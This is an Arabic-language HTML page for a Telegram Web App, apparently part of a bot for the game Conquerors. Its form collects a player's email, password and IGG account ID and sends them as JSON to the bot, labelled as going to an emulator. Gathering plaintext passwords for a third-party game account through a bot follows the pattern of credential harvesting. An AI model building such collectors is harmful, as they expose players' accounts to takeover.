<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل دخول Conquerors</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: system-ui, sans-serif; padding: 20px; background: #18222d; color: #ffffff; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 6px; font-size: 14px; color: #b1c3d5; }
        input { width: 100%; padding: 12px; border: 1px solid #2b394a; border-radius: 8px; background: #212d3b; color: #fff; box-sizing: border-box; font-size: 15px; }
        input:focus { border-color: #2481cc; outline: none; }
        button { width: 100%; padding: 14px; background: #2481cc; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:active { background: #1c68a6; }
    </style>
</head>
<body>
    <h3 style="text-align: center; margin-bottom: 20px;">🔐 استمارة تسجيل الحساب</h3>
    
    <div class="form-group">
        <label>البريد الإلكتروني (Email):</label>
        <input type="email" id="email" placeholder="example@gmail.com">
    </div>
    
    <div class="form-group">
        <label>كلمة السر (Password):</label>
        <input type="password" id="password" placeholder="••••••••">
    </div>
    
    <div class="form-group">
        <label>معرف الحساب (IGG ID):</label>
        <input type="number" id="igg_id" placeholder="123456789">
    </div>
    
    <button onclick="sendData()">🚀 إرسال إلى المحاكي</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function sendData() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const igg_id = document.getElementById('igg_id').value.trim();

            if (!email || !password || !igg_id) {
                alert("يرجى ملء كافة الخانات الثلاث أولاً!");
                return;
            }

            const payload = { email, password, igg_id };
            tg.sendData(JSON.stringify(payload));
        }
    </script>
</body>
</html>
